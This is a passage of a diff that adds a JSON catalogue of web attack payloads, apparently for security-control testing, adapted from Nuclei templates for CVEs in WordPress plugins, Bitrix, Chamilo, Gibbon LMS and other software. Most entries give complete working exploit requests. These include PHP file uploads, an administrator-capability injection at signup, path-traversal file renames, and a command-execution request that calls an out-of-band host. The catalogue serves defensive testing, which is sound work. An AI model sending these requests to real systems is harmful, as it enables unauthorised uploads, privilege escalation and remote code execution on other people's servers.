+    "payload_description": "[Nuclei CVE-2021-34624 by Sourabh-Sahu] A vulnerability in the file uploader component found in the ~/src/Classes/FileUploader.php file of the ProfilePress WordPress plugin made it possible for users to upload arbitrary files during user registration or during profile updates. This issue affects versions 3.0.0 - 3.1.3.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-admin/admin-ajax.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"action\"\n\npp_ajax_signup\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"reg_username\"\n\n{{rand_base(6)}}\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"reg_email\"\n\n{{randstr}}@{{rand_base(5)}}.com\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"reg_password\"\n\n{{rand_base(8)}}\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"reg_password_present\"\n\ntrue\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"reg_first_name\"\n\n{{rand_base(5)}}\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"reg_last_name\"\n\n{{rand_base(5)}}\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"wp_capabilities[administrator]\"\n\n1\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"files\"; filename=\"{{to_lower(rand_text_alpha(5))}}.php\"\nContent-Type: application/x-php\n\n<?php echo \"CVE-2021-34624\"; ?>\n------WebKitFormBoundary7MA4YWxkTrZu0gW--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "3DPrint Lite < 1.9.1.5 - Arbitrary File Upload (Nuclei: CVE-2021-4436)",
+    "payload_external_id": "B8-UPLOAD-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2021-4436 by s4e-io] The plugin does not have any authorisation and does not check the uploaded file in its p3dlite_handle_upload AJAX action , allowing unauthenticated users to upload arbitrary file to the web server. However, there is a .htaccess, preventing the file to be accessed on Web servers such as Apache.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-admin/admin-ajax.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=---------------------------54331109111293931601238262353"
+      }
+    ],
+    "web_request_body": "-----------------------------54331109111293931601238262353\nContent-Disposition: form-data; name=\"action\"\n\np3dlite_handle_upload\n-----------------------------54331109111293931601238262353\nContent-Disposition: form-data; name=\"file\"; filename=\"{{to_lower(rand_text_alpha(5))}}.php\"\nContent-Type: text/php\n\n<?php echo \"{{randstr}}\";unlink(__FILE__);?>\n-----------------------------54331109111293931601238262353--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\"jsonrpc\":\"2\\.0\"|\"filename\":|\\{\\{filename\\}\\}\\.php"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "ZoomSounds Plugin - Unauthenticated Arbitrary File Upload (Nuclei: CVE-2021-4449)",
+    "payload_external_id": "B8-UPLOAD-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2021-4449 by 0xnemian] ZoomSounds plugin for WordPress contains a file upload vulnerability in savepng.php",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/plugins/dzs-zoomsounds/{{to_lower(rand_base(8))}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress eaSYNC Booking <1.1.16 - Arbitrary File Upload (Nuclei: CVE-2022-1952)",
+    "payload_external_id": "B8-UPLOAD-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2022-1952 by theamanrawat] WordPress eaSync Booking plugin bundle for hotel, restaurant and car rental before 1.1.16 is susceptible to arbitrary file upload. The plugin contains insufficient input validation of an AJAX action. An allowlist of valid file extensions is defined but is not used during the validation steps. An ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-admin/admin-ajax.php",
+    "web_request_headers": [
+      {
+        "name": "Cookie",
+        "value": "PHPSESSID=a0d5959357e474aef655313f69891f37"
+      },
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=------------------------98efee55508c5059"
+      }
+    ],
+    "web_request_body": "--------------------------98efee55508c5059\nContent-Disposition: form-data; name=\"action\"\n\neasync_session_store\n--------------------------98efee55508c5059\nContent-Disposition: form-data; name=\"type\"\n\ncar\n--------------------------98efee55508c5059\nContent-Disposition: form-data; name=\"with_driver\"\n\nself-driven\n--------------------------98efee55508c5059\nContent-Disposition: form-data; name=\"driver_license_image2\"; filename=\"{{randstr}}.php\"\nContent-Type: application/octet-stream\n\n<?php echo md5(\"CVE-2022-1952\");unlink(__FILE__);?>\n\n--------------------------98efee55508c5059--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Bonita Web 2021.2 - Authentication/Authorization Bypass (Nuclei: CVE-2022-25237)",
+    "payload_external_id": "B8-UPLOAD-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2022-25237 by Sourabh-Sahu] Bonita Web 2021.2 contains an authentication/authorization bypass vulnerability caused by an overly broad exclude pattern in RestAPIAuthorizationFilter, allowing unauthenticated users to access privileged API endpoints by appending ;i18ntranslation or /../i18ntranslation/ to the URL.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/bonita/API/extension/rce?p=0&c=1&cmd=id",
+    "web_request_headers": [
+      {
+        "name": "Cookie",
+        "value": "JSESSIONID={{jsession}}; X-Bonita-API-Token={{api_token}}"
+      },
+      {
+        "name": "Accept",
+        "value": "application/json"
+      }
+    ],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Bitrix Site Manager - Remote Code Execution (Nuclei: CVE-2022-27228)",
+    "payload_external_id": "B8-UPLOAD-026",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2022-27228 by theamanrawat] In the vote (aka \"Polls, Votes\") module before 21.0.100 of Bitrix Site Manager, a remote unauthenticated attacker can execute arbitrary code.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=---------------------------xxxxxxxxxxxx"
+      }
+    ],
+    "web_request_body": "-----------------------------xxxxxxxxxxxx\nContent-Disposition: form-data; name=\"bxu_files[bitrix50][NAME]\"\n\n{{to_lower(rand_text_alpha(5))}}.txt\n-----------------------------xxxxxxxxxxxx\nContent-Disposition: form-data; name=\"bxu_files[bitrix50][NAME]\";filename=\"{{to_lower(rand_text_alpha(5))}}.jpg\"\nContent-Type: image/jpeg\n\n{{randstr}}\n-----------------------------xxxxxxxxxxxx\nContent-Disposition: form-data; name=\"bxu_info[packageIndex]\"\n\npIndex101\n-----------------------------xxxxxxxxxxxx\nContent-Disposition: form-data; name=\"bxu_info[mode]\"\n\nupload\n-----------------------------xxxxxxxxxxxx\nContent-Disposition: form-data; name=\"sessid\"\n\n{{session_id}}\n-----------------------------xxxxxxxxxxxx\nContent-Disposition: form-data; name=\"bxu_info[filesCount]\"\n\n1\n-----------------------------xxxxxxxxxxxx--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Frontend File Manager < 21.3 - Unauthenticated File Renaming (Nuclei: CVE-2022-3124)",
+    "payload_external_id": "B8-UPLOAD-027",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2022-3124 by riteshs4hu] The Frontend File Manager Plugin WordPress plugin before 21.3 allows any unauthenticated user to rename uploaded files from users. Furthermore, due to the lack of validation in the destination filename, this could allow allow them to change the content of arbitrary files on the web server",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-json/wpfm/v1/file-rename",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "fileid=1&filename=../../../../{{to_lower(rand_text_alpha(6))}}.php",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\"fileid\"\\s*:\\s*\"([^\"]+)\"|\"filename\"\\s*:\\s*\"([^\"]+)\""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Zimbra Collaboration - Unrestricted File Upload (Nuclei: CVE-2022-41352)",
+    "payload_external_id": "B8-UPLOAD-028",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2022-41352 by rxerium] An issue was discovered in Zimbra Collaboration (ZCS) 8.8.15 and 9.0. An attacker can upload arbitrary files through amavis via a cpio loophole (extraction to /opt/zimbra/jetty/webapps/zimbra/public) that can lead to incorrect access to any other user accounts. Zimbra recommends pax over cpio. Al...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/js/zimbraMail/share/model/ZmSettings.js",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "Zimbra\\ Collaboration\\ Suite\\ Web\\ Client|8\\.8\\.15|9\\.0"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "SugarCRM Unauthenticated - Remote Code Execution (Nuclei: CVE-2023-22952)",
+    "payload_external_id": "B8-UPLOAD-029",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2023-22952 by iamnoooob,rootxharsh,pdresearch] In SugarCRM before 12.0. Hotfix 91155, a crafted request can inject custom PHP code through the EmailTemplates because of missing input validation.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/cache/images/{{randstr}}.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "CVE\\-2023\\-22952"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "LG Simple Editor <= v3.21.0 - Command Injection (Nuclei: CVE-2023-40504)",
+    "payload_external_id": "B8-UPLOAD-030",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2023-40504 by s4e-io] LG Simple Editor readVideoInfo Command Injection Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of LG Simple Editor. Authentication is not required to exploit this vulnerability. The specific flaw exists within t...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/simpleeditor/{{rand_base(12)}}.jsp",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Chamilo LMS <= 1.11.24 - Remote Code Execution (Nuclei: CVE-2023-4220)",
+    "payload_external_id": "B8-UPLOAD-031",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2023-4220 by s4e-io] Unrestricted file upload in big file upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` in Chamilo LMS <= v1.11.24 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=------------------------SwxF5rRaZb4lETWlpulXn3"
+      }
+    ],
+    "web_request_body": "--------------------------SwxF5rRaZb4lETWlpulXn3\nContent-Disposition: form-data; name=\"bigUploadFile\"; filename=\"{{rand_base(10)}}.txt\"\nContent-Type: application/octet-stream\n\n{{md5(num)}}\n\n--------------------------SwxF5rRaZb4lETWlpulXn3--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Gibbon LMS <= v25.0.01 - File Upload to RCE (Nuclei: CVE-2023-45878)",
+    "payload_external_id": "B8-UPLOAD-032",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2023-45878 by ajdumanhug] Gibbon LMS versions 25.0.1 and earlier are vulnerable to an Arbitrary File Upload that can lead to Remote Code Execution (RCE). The issue stems from the rubrics_visualise_saveAjax.php endpoint, which, notably, does not require authentication. Because of this, unauthenticated attackers could poten...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{rand_base(6)}}.php?cmd=nslookup+{{interactsh-url}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "GL.iNet <= 4.3.7 - Arbitrary File Write (Nuclei: CVE-2023-46455)",
+    "payload_external_id": "B8-UPLOAD-033",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2023-46455 by Zierax] GL.iNet <= 4.3.7 is vulnerable to an arbitrary file write exploit, allowing an attacker to overwrite arbitrary system files.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/upload",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=---------------------------81419250823331111993422505835"
+      },
+      {
+        "name": "X-Requested-With",
+        "value": "XMLHttpRequest"
+      }
+    ],
+    "web_request_body": "-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"sid\"\n\n{{auth_token}}\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"size\"\n\n4\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"path\"\n\n/tmp/{{to_lower(rand_text_alpha(5))}}\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"file\"; filename=\"{{to_lower(rand_text_alpha(4))}}\"\nContent-Type: application/octet-stream\n\n{{to_lower(rand_text_alpha(5))}}\n-----------------------------81419250823331111993422505835--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "File\\ uploaded\\ successfully"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress WP Child Theme Generator < 1.1.3 - Arbitrary File Upload (Nuclei: CVE-2023-47873)",
+    "payload_external_id": "B8-UPLOAD-034",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2023-47873 by cysamu,Crux] Unrestricted Upload of File with Dangerous Type vulnerability in WEN Solutions WP Child Theme Generator.This issue affects WP Child Theme Generator- from n/a through 1.0.9.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/themes/{{to_lower(rand_text_alpha(6))}}/screenshot.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Elementor 3.18.1 - File Upload/Remote Code Execution (Nuclei: CVE-2023-48777)",
+    "payload_external_id": "B8-UPLOAD-035",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2023-48777 by DhiyaneshDK] The plugin is vulnerable to Remote Code Execution via file upload via the template import functionality, allowing authenticated attackers, with contributor-level access and above, to upload files and execute code on the server.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-login.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "log={{username}}&pwd={{password}}&wp-submit=Log+In",
+    "web_request_body_type": "form",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Peplink Balance Two before 8.4.0 - Unauthenticated Config Upload (Nuclei: CVE-2023-49230)",
+    "payload_external_id": "B8-UPLOAD-036",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2023-49230 by srilakivarma] A vulnerability in Peplink Balance Two prior to version 8.4.0 allows unauthenticated attackers to modify captive portal configurations due to a missing authorization check. Specifically, attackers can upload files via /guest/portal_admin_upload.cgi, with the changes reflected at /guest/preview.cg...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/guest/api.cgi",
+    "web_request_headers": [],
+    "web_request_body": "mode=info&option=preview&portal_id=1",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Likeshop < 2.5.7.20210311 - Arbitrary File Upload (Nuclei: CVE-2024-0352)",
+    "payload_external_id": "B8-UPLOAD-037",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-0352 by CookieHanHoan,babybash,samuelsamuelsamuel] A vulnerability classified as critical was found in Likeshop up to 2.5.7.20210311. This vulnerability affects the function FileServer::userFormImage of the file server/application/api/controller/File.php of the component HTTP POST Request Handler. The manipulation of the argument file with an unk...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/api/file/formimage",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
+      },
+      {
+        "name": "User-Agent",
+        "value": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundarygcflwtei\nContent-Disposition: form-data; name=\"file\";filename=\"{{rand_base(6)}}.php\"\nContent-Type: application/x-php\n\n{{randstr}}\n------WebKitFormBoundarygcflwtei--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Monitorr Services Configuration - Arbitrary File Upload (Nuclei: CVE-2024-0713)",
+    "payload_external_id": "B8-UPLOAD-038",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-0713 by DhiyaneshDK] A vulnerability was found in Monitorr 1.7.6m. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file /assets/php/upload.php of the component Services Configuration. The manipulation of the argument fileToUpload leads to unrestricted upload. The at...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/assets/data/usrimg/{{to_lower(rand_text_alpha(5))}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "atfersotg"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Smart S210 Management Platform - Arbitary File Upload (Nuclei: CVE-2024-0939)",
+    "payload_external_id": "B8-UPLOAD-039",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2024-0939 by DhiyaneshDk] A vulnerability has been found in Byzoro Smart S210 Management Platform up to 20240117 and classified as critical. This vulnerability affects unknown code of the file /Tool/uploadfile.php. The manipulation of the argument file_upload leads to unrestricted upload.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
